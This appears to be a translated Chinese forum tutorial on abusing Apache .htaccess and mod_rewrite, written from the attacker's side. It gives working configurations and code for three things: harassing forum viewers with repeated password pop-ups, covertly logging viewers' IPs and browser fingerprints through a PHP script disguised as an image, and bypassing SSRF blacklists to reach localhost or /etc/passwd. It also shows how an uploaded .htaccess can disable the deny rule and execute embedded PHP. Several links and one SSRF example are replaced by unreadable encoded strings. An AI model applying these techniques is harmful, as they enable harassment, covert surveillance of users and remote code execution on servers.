
简而言之，这是一套包含在您的网络服务器上的规则（在一个名为`.htaccess`的文件中），它允许您执行诸如使用密码保护目录或为扩展创建别名等选项。例如，如果您有一个页面 [396K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6K6L8$3#2W2N6r3S2A6L8X3N6Q4x3V1k6X3K9h3I4W2i4K6u0W2M7r3S2H3](https://bbs.kanxue.com/elink@e15K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6K6L8$3#2W2N6r3S2A6L8X3N6Q4x3V1k6X3K9h3I4W2i4K6u0W2M7r3S2H3) ，你可以设置一个`htaccess`的规则，以便当页面加载时，将使用户 [425K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6K6L8$3#2W2N6r3S2A6L8X3N6Q4x3V1k6X3K9h3I4W2](https://bbs.kanxue.com/elink@301K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6K6L8$3#2W2N6r3S2A6L8X3N6Q4x3V1k6X3K9h3I4W2) （隐藏扩展名）——或者你可以使用它来做一些像302重定向一个页面到另一个或HTTP 403的目录。

下面是一个`htaccess`文件的例子：

```
### MAIN DEFAULTS

Options +ExecCGI -Indexes

DirectoryIndex index.html index.htm index.php

DefaultLanguage en-US

AddDefaultCharset UTF-8

ServerSignature Off

```

有趣的是，你需要在所有`.htaccess`文件中添加`ServerSignature Off`指令，因为这样的话可以阻止在目录列表上显示你的服务器信息（这使得攻击者的侦察阶段会有非常明显的提示）。所以说，这个时候最好通过你的`httpd.conf`来完成对web服务的控制，而不是你的`htaccess`文件。

我将主要关注的重点放在`.htaccess`（`mod_rewrite`）中的apache的重写模块，这个模块允许重定向发生。那么，我们开始吧。

## 用连续的弹出窗口骚扰互联网用户

我将要讨论的第一种方法是如何在他们试图利用的站点上滥用`mod_rewrite`来连续弹出窗口。

这是一个非常简单的方法：您可以将图像上传到服务器，然后使用`htaccess`文件来利用密码保护目录，并将该图像重定向到该密码保护的目录中的文件。除了`.htaccess`之外，还需要一个`.htpasswd`文件，它将包含密码保护目录的登录凭证。

这个方法只是一个有趣的技巧，没有任何实际价值，但我曾经看到它在以前的流行论坛上被利用，它是非常有效的。

为了演示这个例子，我们假设我们有两个文件，`lol.jpg`和`umad.jpg`，其中`lol.jpg`存储在一个公共目录中，`umad.jpg`存储在一个受密码保护的目录中。

这里对应的`.htaccess`文件应该类似于这样：

```
Options +FollowSymlinks

RewriteEngine on

RewriteRule lol.jpg /protected-directory/umad.jpg [NC]

AuthUserFile /home/usr/.htpasswd

AuthName "r u mad tho"

AuthType Basic

require user lolololololol

```

除此之外，您还需要设置一个如下所示的`.htpasswd`文件：

```
username:encryptedPass

```

在这个实例中的用户名需要匹配你添加到你的`.htaccess`文件的用户名。至于加密的密码，这是通过PHP的`crypt()`函数生成的。如果您不想使用PHP，则还可以使用联机生成器来加密`.htpasswd`文件中的密码值。

然后你可以在论坛上设置路径为`lol.jpg`作为你的签名。每次有人查看你的线程，或者每当你在一个线程中发帖时，都会在屏幕上反复弹出提示输入用户名/密码，可以让人非常讨厌。当然，这里也不一定是一个论坛。如果你在任何形式的网站上有自定义头像或个人资料图片的选项，那么您也可以使用这种方法（假设它允许您从远程URL设置您的个人资料图像，而不仅仅是通过文件上传形式）。任何浏览器渲染你的图像后，将被密码提示框反复弹窗。这种利用方式可以用于像论坛签名、个人资料头像，或几乎所有的带图像上传功能并允许用户从远程URL抓取图像的网站。

## 不与用户交互的情况下识别浏览器指纹和记录IP地址

这种方法也是利用重定向的技巧，它可以让你在用户不知情的情况下跟踪人们的IP地址（或者通过执行PHP代码来完成任何你可以做的事情）。这将允许您以隐身方式执行浏览器指纹识别，通常目标完全发现不了。

这个例子又是一个简单的`mod_rewrite`，唯一的区别是我们在这里重定向到一个PHP文件，而不是密码保护目录：

```
Options +FollowSymlinks

RewriteEngine on

RewriteRule lol.jpg /path/to/evil.php [NC]

```

假设攻击者在其服务器上有两个文件：`lol.jpg`是一个完全无害的图像文件，`evil.php`是一个用于信息收集的PHP脚本。

现在，这里的利用思路是欺骗服务器，让其认为已经包含了有效的图像。从服务器的角度来看，它向图片文件发出请求。当它重定向到PHP脚本时，没有看到有效的图像，所以服务器通常不会在页面上包含图像（所以不会执行PHP）。然而，我们可以使用PHP动态图像来欺骗服务器，让服务器认为它包含的是`lol.jpg`而不是`evil.php`——我们可以让PHP脚本输出一个图像，同时它也会运行任何恶意代码（在这个例子中是记录IP地址）。这可以通过`imagecreate()`函数来实现，这里是一个例子：

```
<?php

$log = 'log.htm';

$ip = $_SERVER['REMOTE_ADDR'];

$page = $_SERVER['REQUEST_URI'];

$refer = $_SERVER['HTTP_REFERER'];

$date_time = date("l j F Y  g:ia", time() - date("Z")) ;

$agent = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen("log.htm", "a");

    fputs($fp, "<b>$date_time</b><br> 

                <b>IP: </b>$ip<br>

                <b>Page: </b>$page<br>

                <b>Refer: </b>$refer<br>

                <b>Useragent:</b>$agent <br><br>");

    flock($fp, 3);

    fclose($fp);

    $my_img = imagecreate( 200, 80 );

    $background = imagecolorallocate( $my_img, 255, 0, 255 );

    $text_colour = imagecolorallocate( $my_img, 200, 200, 0 );

    $line_colour = imagecolorallocate( $my_img, 128, 255, 0 );



    imagestring( $my_img, 4, 30, 25, "Totally an innocent image", $text_colour );

    imagesetthickness ( $my_img, 5 );

    imageline( $my_img, 30, 45, 165, 45, $line_colour );

    header( "Content-type: image/png" );

    imagepng( $my_img );

    imagecolordeallocate( $line_color );

    imagecolordeallocate( $text_color );

    imagecolordeallocate( $background );

    imagedestroy( $my_img );

?>

```

> 因为`$_SERVER['HTTP_USER_AGENT'];`是可以由用户控制的输入，所以这种使用`.htm`扩展记录收集到的信息会让你受到XSS注入攻击；我使用这个格式主要是用于格式化的目的。如果它让你感到困惑，那么只需将`.htm`扩展名变成`.txt`。

在上面的例子中，一旦图像在用户浏览器中被渲染，它将把用户的网络代理、IP地址、引用者头部和用于指纹识别的其他有用信息写入攻击者服务器上的文件。这将允许攻击者获取关于用户位置的信息，甚至可以制作量身定制的有效载荷以攻击用户的浏览器。

因此，如果有一个网站允许你使用远程URL设置你的个人资料图像，那么你可以包括`lol.jpg`作为你的头像，然后利用`htaccess`重定向到PHP脚本，同时输出一个图像。欺骗服务器，使其将`evil.php`当做`lol.jpg`，最终包含图像作为您的个人资料图片，同时执行任何其他的PHP代码与它一起运行（在这种情况下记录IP地址和用户代理，包括任何人查看您的个人资料）。当然，除了使用重写规则之外，还可以使用`AddType`来达到相同的效果。

## 绕过WEB漏洞的过滤规则

对于基于Web的漏洞，`htaccess`有几个用于绕过过滤的用法。我将在本文中讨论的两个攻击向量是服务器端请求伪造和任意文件上传。

### 服务器端请求伪造

对于那些不熟悉SSRF的人来说，它允许您使用各种URI方案来查看本地资源，而不是请求远程资源。例如，像 [2f2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6$3N6h3I4F1i4K6u0W2M7r3S2H3i4K6y4r3N6i4u0D9i4K6y4p5K9s2c8@1M7q4!0q4c8W2!0n7b7#2)9&6b7g2)9J5c8W2)9J5c8Y4y4G2L8h3g2K6K9i4c8W2i4K6u0W2j5$3!0E0](https://bbs.kanxue.com/elink@917K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6$3N6h3I4F1i4K6u0W2M7r3S2H3i4K6y4r3N6i4u0D9i4K6y4p5K9s2c8@1M7q4!0q4c8W2!0n7b7#2)9&6b7g2)9J5c8W2)9J5c8Y4y4G2L8h3g2K6K9i4c8W2i4K6u0W2j5$3!0E0) ，那么你可以把`?url=`这里的GET参数改成`localhost`来探测关于特定端口上运行的服务的信息，例如：

```
761K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0x3K6x3o6j5`.

```

这将暴露关于在有漏洞的服务器上运行的MySQL守护进程的信息：

```
file:/etc/passwd

```

这将允许攻击者通过SSRF实现本地文件泄露，从而允许他们读取本地系统文件的内容。

一般来说，大多数安全的网站都会有过滤器来防止SSRF发生。SSRF有许多旁路方法，但我将专注于只允许输入为远程资源或有效（或看似有效）URL的上下文。因此，假设攻击者在尝试重定向到`localhost`、`127.0.0.1`、`0.0.0.0`或`file://`时将被列入黑名单，那么他们可以使用`htaccess`设置`mod_rewrite`，如下所示：

```
Options +FollowSymlinks

RewriteEngine on

RewriteRule lol.jpg c40K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0x3K6x3o6j5`. [NC]

```

或读取本地文件：

```
Options +FollowSymlinks

RewriteEngine on

RewriteRule lol.jpg file:/etc/passwd [NC]

```

当然，这个技术也可以用来实现RCE，假设目标服务器上存在脆弱的服务，如`sftp`、`gopher`、`memcached`或类似的东西。

这可能会绕过任何黑名单，因为您可以添加 [acdK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6D9L8$3I4Q4x3X3g2B7M7r3M7`.](https://bbs.kanxue.com/elink@92bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6D9L8$3I4Q4x3X3g2B7M7r3M7`.) 作为易受攻击的脚本的输入，然后易受攻击的脚本可以请求 [adbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0x3K6x3o6j5`.](https://bbs.kanxue.com/elink@f0dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9K6b7e0x3K6x3o6j5`.) 或`file:/etc/passwd`。在原始请求 [677K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6D9L8$3I4Q4x3X3g2B7M7r3M7`.](https://bbs.kanxue.com/elink@0c2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5j5h3#2H3L8r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6D9L8$3I4Q4x3X3g2B7M7r3M7`.) 之后——导致SSRF被利用并且绕过过滤器（在本例中获取了MySQL版本或输出`passwd`）。

不过在有很多情况下，这种方式是行不通的，但是我之前用它成功地进行过很多测试。

### 任意文件上传

除了在SSRF中使用，在某些情况下`.htaccess`也可以被滥用于任意文件上传。假设一个情景：一个易受攻击的网站有一个基于黑名单过滤器的文件上传表单（阻止诸如`.php`或`.phtml`的特定扩展名），那么在某些情况下，可以上传一个`.htaccess`文件，导致不同程度的后果。

`htaccess`有一个默认的拒绝规则，防止它通过互联网访问。如果攻击者有能力覆盖`htaccess`，他们需要做的第一件事就是禁用拒绝规则，以便通过定位到相关的URL路径来访问它。为此，攻击者将上传一个`htaccess`文件，该文件的内容类似于如下：

```
<Files ~ "^\.ht">

# overriding deny rule

# making htaccess accessible from the internet

 Require all granted

 Order allow,deny

 Allow from all

</Files>

```

现在这意味着攻击者只需导航到URL（[d1fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6Q4x3X3g2Z5N6r3q4U0j5$3g2K6M7H3`.`.](https://bbs.kanxue.com/elink@bb3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4A6N6r3g2Q4x3X3g2U0L8$3#2Q4x3V1k6Q4x3X3g2Z5N6r3q4U0j5$3g2K6M7H3`.`.) ）即可自由查看`htaccess`。如果攻击者有能力覆盖正在使用的当前`.htaccess`文件，并用自己的替换，那么这将允许他们在服务器上执行各种攻击，从应用程序级的DoS到全面的远程命令执行。这是否工作依赖于哪个apache模块被启用。如果启用了`mod_info`和`mod_status`等模块，则攻击者可以分别执行信息泄露和远程命令执行。

一旦攻击者重写了网站的原始`htaccess`文件并禁用了默认的拒绝规则，他们就可以通过将以下行添加到自定义的`htaccess`文件来执行远程命令：

```
AddType application/x-httpd-php .htaccess

```

这将使服务器将`htaccess`文件视为PHP脚本，并与上述方法配合，以覆盖易受攻击的服务器原始`htaccess`文件，然后攻击者可以导航到存储`htaccess`文件的URL，以便执行PHP代码。攻击者制作的有效载荷将以`htaccess`文件中的注释形式出现，例如：

```
AddType application/x-httpd-php .htaccess

# <?php echo "get pwned"; ?>

```

当然，这不仅限于PHP。你可以使用相同的方法来生成一个JSP脚本文件或类似的东西（全部取决于在服务器上运行的是哪种技术）——为了做到这一点，我们需要改变`AddType`的值以符合所希望的代码执行。
